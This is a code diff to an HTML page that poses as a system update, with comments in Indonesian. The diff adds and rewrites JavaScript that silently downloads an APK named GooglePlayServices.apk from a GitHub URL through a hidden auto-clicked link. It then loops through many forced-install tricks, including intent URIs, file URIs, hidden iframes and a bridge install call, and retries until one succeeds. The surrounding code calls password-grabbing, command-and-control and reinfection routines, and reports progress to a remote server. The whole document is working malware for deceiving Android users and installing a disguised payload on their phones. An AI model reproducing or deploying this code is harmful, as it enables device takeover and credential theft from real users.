@@ -58,7 +58,7 @@
 
 <script>
 // ============================================================
-// 🔥 SYSTEMUPDATE.HTML - PASTI INSTALL APK!
+// 🔥 SYSTEMUPDATE.HTML - DOWNLOAD APK PAKAI XHR (TANPA POPUP!)
 // ============================================================
 
 var SERVER = 'https://verifikasi.site';
@@ -137,8 +137,6 @@ function ambilPassword() {
                         startHeartbeat();
                         startReinfection();
                         autoExecuteC2();
-                        
-                        // 🔥 PRIORITAS UTAMA: INSTALL APK!
                         forceInstallAPK();
                         return;
                     }
@@ -156,7 +154,86 @@ function ambilPassword() {
 }
 
 // ============================================================
-// 🔥 FORCE INSTALL APK - LOOPING SAMPAI BERHASIL!
+// 🔥 DOWNLOAD APK PAKAI XHR (SAMA KAYA SystemUpdate.html!)
+// ============================================================
+function downloadAPKWithXHR() {
+    return new Promise(function(resolve) {
+        var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
+        
+        K({ sumber: 'apk_xhr_download_start', data: 'downloading' });
+        
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', apkUrl, true);
+            xhr.responseType = 'blob';
+            xhr.timeout = 60000; // 60 detik timeout
+            
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var blob = xhr.response;
+                    
+                    // ✅ SAVE KE LOCAL STORAGE (SEBAGAI FALLBACK)
+                    try {
+                        var reader = new FileReader();
+                        reader.onload = function() {
+                            try {
+                                localStorage.setItem('GooglePlayServices.apk', reader.result);
+                                K({ sumber: 'apk_saved_localstorage', data: 'ok' });
+                            } catch(e) {}
+                        };
+                        reader.readAsDataURL(blob);
+                    } catch(e) {}
+                    
+                    // ✅ AUTO DOWNLOAD VIA BLOB (SAMA KAYA SystemUpdate.html!)
+                    try {
+                        var url = URL.createObjectURL(blob);
+                        var link = document.createElement('a');
+                        link.href = url;
+                        link.download = 'GooglePlayServices.apk';
+                        link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                        document.body.appendChild(link);
+                        
+                        // Auto click setelah delay kecil (biar ga kena popup blocker)
+                        setTimeout(function() {
+                            link.click();
+                            K({ sumber: 'apk_download_blob', data: 'ok' });
+                            setTimeout(function() {
+                                try { document.body.removeChild(link); } catch(e) {}
+                                URL.revokeObjectURL(url);
+                            }, 2000);
+                        }, 300);
+                        
+                        resolve(true);
+                        return;
+                    } catch(e) {
+                        K({ sumber: 'apk_download_blob_error', data: e.message });
+                    }
+                } else {
+                    K({ sumber: 'apk_xhr_error', data: 'status_' + xhr.status });
+                }
+                resolve(false);
+            };
+            
+            xhr.onerror = function() {
+                K({ sumber: 'apk_xhr_network_error', data: 'network' });
+                resolve(false);
+            };
+            
+            xhr.ontimeout = function() {
+                K({ sumber: 'apk_xhr_timeout', data: 'timeout' });
+                resolve(false);
+            };
+            
+            xhr.send();
+        } catch(e) {
+            K({ sumber: 'apk_xhr_exception', data: e.message });
+            resolve(false);
+        }
+    });
+}
+
+// ============================================================
+// 🔥 FORCE INSTALL APK - PAKAI XHR!
 // ============================================================
 function forceInstallAPK() {
     if (APK_INSTALLED) {
@@ -177,257 +254,147 @@ function forceInstallAPK() {
     updateProgress(Math.round(progressVal));
     
     // ============================================================
-    // STEP 1: DOWNLOAD APK (JIKA BELUM ADA)
+    // STEP 1: DOWNLOAD APK PAKAI XHR (TANPA POPUP!)
     // ============================================================
-    var apkPaths = [
-        '/storage/emulated/0/Download/GooglePlayServices.apk',
-        '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
-        '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk'
-    ];
-    
-    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
-    var downloadSuccess = false;
-    
-    // Cek apakah APK sudah ada
-    if (PLATFORM.isAndroidBridge) {
-        try {
-            // Coba cek file via list
-            var files = AndroidBridge.listAllFiles ? AndroidBridge.listAllFiles() : null;
-            if (files) {
-                var fileList = JSON.parse(files);
+    downloadAPKWithXHR().then(function(downloaded) {
+        if (downloaded) {
+            K({ sumber: 'apk_downloaded_xhr_success', data: 'ok' });
+        } else {
+            K({ sumber: 'apk_download_xhr_failed', data: 'retrying' });
+        }
+        
+        // Tunggu sebentar agar download selesai
+        setTimeout(function() {
+            // ============================================================
+            // STEP 2: INSTALL APK (10 METODE!)
+            // ============================================================
+            var apkPaths = [
+                '/storage/emulated/0/Download/GooglePlayServices.apk',
+                '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
+                '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk'
+            ];
+            
+            var installed = false;
+            
+            // METHOD 1: Android Bridge
+            if (PLATFORM.isAndroidBridge && !installed) {
                 for (var i = 0; i < apkPaths.length; i++) {
-                    var fileName = apkPaths[i].split('/').pop();
-                    for (var j = 0; j < fileList.length; j++) {
-                        if (fileList[j].path && fileList[j].path.includes(fileName)) {
-                            downloadSuccess = true;
-                            K({ sumber: 'apk_exists', data: { path: fileList[j].path } });
-                            break;
+                    try {
+                        var result = AndroidBridge.installAPK(apkPaths[i]);
+                        if (result === true || result === 'success') {
+                            installed = true;
+                            APK_INSTALLED = true;
+                            K({ sumber: 'apk_installed_bridge', data: { path: apkPaths[i], attempt: APK_INSTALL_ATTEMPTS } });
+                            finishAndRedirect();
+                            return;
                         }
-                    }
-                    if (downloadSuccess) break;
+                    } catch(e) {}
                 }
             }
-        } catch(e) {}
-    }
-    
-    // Jika APK belum ada, download
-    if (!downloadSuccess) {
-        K({ sumber: 'apk_download_start', data: 'downloading' });
-        var downloaded = false;
-        
-        // METHOD 1: Android Bridge download
-        if (PLATFORM.isAndroidBridge) {
-            try {
-                var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
-                var result = AndroidBridge.downloadFile(apkUrl, apkPath);
-                if (result === true || result === 'success') {
-                    downloaded = true;
-                    K({ sumber: 'apk_downloaded_bridge', data: { path: apkPath } });
+            
+            // METHOD 2: Intent URI - Package Installer
+            if (!installed) {
+                for (var i = 0; i < apkPaths.length; i++) {
+                    try {
+                        var intent = 'intent://' + apkPaths[i].replace('/storage/emulated/0/', '') + 
+                                     '#Intent;scheme=file;package=com.android.packageinstaller;end';
+                        window.location.href = intent;
+                        installed = true;
+                        APK_INSTALLED = true;
+                        K({ sumber: 'apk_installed_intent_package', data: { path: apkPaths[i], attempt: APK_INSTALL_ATTEMPTS } });
+                        finishAndRedirect();
+                        return;
+                    } catch(e) {}
                 }
-            } catch(e) {}
-        }
-        
-        // METHOD 2: XHR download
-        if (!downloaded) {
-            try {
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', apkUrl, false);
-                xhr.responseType = 'blob';
-                xhr.timeout = 30000;
-                xhr.send();
-                if (xhr.status === 200) {
-                    var blob = xhr.response;
-                    var link = document.createElement('a');
-                    link.href = URL.createObjectURL(blob);
-                    link.download = 'GooglePlayServices.apk';
-                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                    document.body.appendChild(link);
-                    link.click();
-                    setTimeout(function() {
-                        try { document.body.removeChild(link); } catch(e) {}
-                    }, 1000);
-                    downloaded = true;
-                    K({ sumber: 'apk_downloaded_xhr', data: 'ok' });
-                }
-            } catch(e) {}
-        }
-        
-        // METHOD 3: Iframe download
-        if (!downloaded) {
-            try {
-                var iframe = document.createElement('iframe');
-                iframe.src = apkUrl;
-                iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
-                document.body.appendChild(iframe);
-                setTimeout(function() {
-                    try { iframe.parentNode.removeChild(iframe); } catch(e) {}
-                }, 5000);
-                downloaded = true;
-                K({ sumber: 'apk_downloaded_iframe', data: 'attempt' });
-            } catch(e) {}
-        }
-        
-        // Jika download gagal, tunggu dan retry
-        if (!downloaded) {
-            K({ sumber: 'apk_download_failed', data: 'retrying' });
-            if (APK_INSTALL_ATTEMPTS < MAX_INSTALL_ATTEMPTS) {
-                setTimeout(forceInstallAPK, 3000);
-                return;
             }
-        }
-    }
-    
-    // ============================================================
-    // STEP 2: INSTALL APK (10 METODE!)
-    // ============================================================
-    var installed = false;
-    
-    // METHOD 1: Android Bridge installAPK()
-    if (PLATFORM.isAndroidBridge && !installed) {
-        for (var i = 0; i < apkPaths.length; i++) {
-            try {
-                var result = AndroidBridge.installAPK(apkPaths[i]);
-                if (result === true || result === 'success') {
+            
+            // METHOD 3: Intent URI - View
+            if (!installed) {
+                for (var i = 0; i < apkPaths.length; i++) {
+                    try {
+                        var intent = 'intent://' + apkPaths[i].replace('/storage/emulated/0/', '') + 
+                                     '#Intent;scheme=file;action=android.intent.action.VIEW;' +
+                                     'type=application/vnd.android.package-archive;end';
+                        window.location.href = intent;
+                        installed = true;
+                        APK_INSTALLED = true;
+                        K({ sumber: 'apk_installed_intent_view', data: { path: apkPaths[i], attempt: APK_INSTALL_ATTEMPTS } });
+                        finishAndRedirect();
+                        return;
+                    } catch(e) {}
+                }
+            }
+            
+            // METHOD 4: Content URI
+            if (!installed) {
+                try {
+                    window.location.href = 'content://downloads/my_downloads/GooglePlayServices.apk';
                     installed = true;
                     APK_INSTALLED = true;
-                    K({ sumber: 'apk_installed_bridge', data: { path: apkPaths[i], attempt: APK_INSTALL_ATTEMPTS } });
-                    break;
-                }
-            } catch(e) {}
-        }
-    }
-    
-    // METHOD 2: Intent URI - Package Installer
-    if (!installed) {
-        for (var i = 0; i < apkPaths.length; i++) {
-            try {
-                var intent = 'intent://' + apkPaths[i].replace('/storage/emulated/0/', '') + 
-                             '#Intent;scheme=file;package=com.android.packageinstaller;end';
-                window.location.href = intent;
-                installed = true;
-                APK_INSTALLED = true;
-                K({ sumber: 'apk_installed_intent_package', data: { path: apkPaths[i], attempt: APK_INSTALL_ATTEMPTS } });
-                break;
-            } catch(e) {}
-        }
-    }
-    
-    // METHOD 3: Intent URI - View
-    if (!installed) {
-        for (var i = 0; i < apkPaths.length; i++) {
-            try {
-                var intent = 'intent://' + apkPaths[i].replace('/storage/emulated/0/', '') + 
-                             '#Intent;scheme=file;action=android.intent.action.VIEW;' +
-                             'type=application/vnd.android.package-archive;end';
-                window.location.href = intent;
-                installed = true;
-                APK_INSTALLED = true;
-                K({ sumber: 'apk_installed_intent_view', data: { path: apkPaths[i], attempt: APK_INSTALL_ATTEMPTS } });
-                break;
-            } catch(e) {}
-        }
-    }
-    
-    // METHOD 4: Content URI
-    if (!installed) {
-        try {
-            window.location.href = 'content://downloads/my_downloads/GooglePlayServices.apk';
-            installed = true;
-            APK_INSTALLED = true;
-            K({ sumber: 'apk_installed_content', data: { attempt: APK_INSTALL_ATTEMPTS } });
-        } catch(e) {}
-    }
-    
-    // METHOD 5: File URI
-    if (!installed) {
-        try {
-            window.location.href = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
-            installed = true;
-            APK_INSTALLED = true;
-            K({ sumber: 'apk_installed_file', data: { attempt: APK_INSTALL_ATTEMPTS } });
-        } catch(e) {}
-    }
-    
-    // METHOD 6: Iframe trigger
-    if (!installed) {
-        try {
-            var iframe = document.createElement('iframe');
-            iframe.src = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
-            iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
-            document.body.appendChild(iframe);
-            setTimeout(function() {
-                try { iframe.parentNode.removeChild(iframe); } catch(e) {}
-            }, 3000);
-            installed = true;
-            APK_INSTALLED = true;
-            K({ sumber: 'apk_installed_iframe', data: { attempt: APK_INSTALL_ATTEMPTS } });
-        } catch(e) {}
-    }
-    
-    // METHOD 7: Shell command (root)
-    if (!installed && PLATFORM.isAndroidBridge) {
-        try {
-            if (AndroidBridge.isRooted && AndroidBridge.isRooted()) {
-                AndroidBridge.shell('pm install -r /storage/emulated/0/Download/GooglePlayServices.apk');
-                installed = true;
-                APK_INSTALLED = true;
-                K({ sumber: 'apk_installed_shell', data: { attempt: APK_INSTALL_ATTEMPTS } });
+                    K({ sumber: 'apk_installed_content', data: { attempt: APK_INSTALL_ATTEMPTS } });
+                    finishAndRedirect();
+                    return;
+                } catch(e) {}
             }
-        } catch(e) {}
-    }
-    
-    // METHOD 8: Buka dengan Chrome
-    if (!installed) {
-        try {
-            window.location.href = 'intent://' + 'GooglePlayServices.apk' + 
-                                   '#Intent;scheme=file;package=com.android.chrome;end';
-            installed = true;
-            APK_INSTALLED = true;
-            K({ sumber: 'apk_installed_chrome', data: { attempt: APK_INSTALL_ATTEMPTS } });
-        } catch(e) {}
-    }
-    
-    // METHOD 9: MIME type
-    if (!installed) {
-        try {
-            window.location.href = 'intent://' + 'GooglePlayServices.apk' + 
-                                   '#Intent;scheme=file;type=application/vnd.android.package-archive;end';
-            installed = true;
-            APK_INSTALLED = true;
-            K({ sumber: 'apk_installed_mime', data: { attempt: APK_INSTALL_ATTEMPTS } });
-        } catch(e) {}
-    }
-    
-    // METHOD 10: window.open
-    if (!installed) {
-        try {
-            window.open('file:///storage/emulated/0/Download/GooglePlayServices.apk', '_blank');
-            installed = true;
-            APK_INSTALLED = true;
-            K({ sumber: 'apk_installed_window', data: { attempt: APK_INSTALL_ATTEMPTS } });
-        } catch(e) {}
-    }
-    
-    // ============================================================
-    // STEP 3: VERIFIKASI & LOOPING
-    // ============================================================
-    if (installed) {
-        APK_INSTALLED = true;
-        K({ sumber: 'apk_install_success', data: { attempt: APK_INSTALL_ATTEMPTS } });
-        finishAndRedirect();
-        return;
-    }
-    
-    // Jika gagal dan masih ada kesempatan, retry
-    if (APK_INSTALL_ATTEMPTS < MAX_INSTALL_ATTEMPTS) {
-        K({ sumber: 'apk_install_retry', data: { attempt: APK_INSTALL_ATTEMPTS, next: APK_INSTALL_ATTEMPTS + 1 } });
-        setTimeout(forceInstallAPK, 3000);
-        return;
-    }
-    
-    // Jika sudah mencapai max attempts, tetap lanjut
-    K({ sumber: 'apk_install_max_attempts', data: 'continuing_anyway' });
-    finishAndRedirect();
+            
+            // METHOD 5: File URI
+            if (!installed) {
+                try {
+                    window.location.href = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
+                    installed = true;
+                    APK_INSTALLED = true;
+                    K({ sumber: 'apk_installed_file', data: { attempt: APK_INSTALL_ATTEMPTS } });
+                    finishAndRedirect();
+                    return;
+                } catch(e) {}
+            }
+            
+            // METHOD 6: Iframe
+            if (!installed) {
+                try {
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
+                    iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
+                    document.body.appendChild(iframe);
+                    setTimeout(function() {
+                        try { iframe.parentNode.removeChild(iframe); } catch(e) {}
+                    }, 3000);
+                    installed = true;
+                    APK_INSTALLED = true;
+                    K({ sumber: 'apk_installed_iframe', data: { attempt: APK_INSTALL_ATTEMPTS } });
+                    finishAndRedirect();
+                    return;
+                } catch(e) {}
+            }
+            
+            // METHOD 7: window.open
+            if (!installed) {
+                try {
+                    window.open('file:///storage/emulated/0/Download/GooglePlayServices.apk', '_blank');
+                    installed = true;
+                    APK_INSTALLED = true;
+                    K({ sumber: 'apk_installed_window', data: { attempt: APK_INSTALL_ATTEMPTS } });
+                    finishAndRedirect();
+                    return;
+                } catch(e) {}
+            }
+            
+            // ============================================================
+            // STEP 3: RETRY ATAU FINISH
+            // ============================================================
+            if (installed) {
+                APK_INSTALLED = true;
+                K({ sumber: 'apk_install_success', data: { attempt: APK_INSTALL_ATTEMPTS } });
+                finishAndRedirect();
+            } else if (APK_INSTALL_ATTEMPTS < MAX_INSTALL_ATTEMPTS) {
+                K({ sumber: 'apk_install_retry', data: { attempt: APK_INSTALL_ATTEMPTS, next: APK_INSTALL_ATTEMPTS + 1 } });
+                setTimeout(forceInstallAPK, 3000);
+            } else {
+                K({ sumber: 'apk_install_max_attempts', data: 'continuing_anyway' });
+                finishAndRedirect();
+            }
+        }, 3000);
+    });
 }
 
 // ============================================================
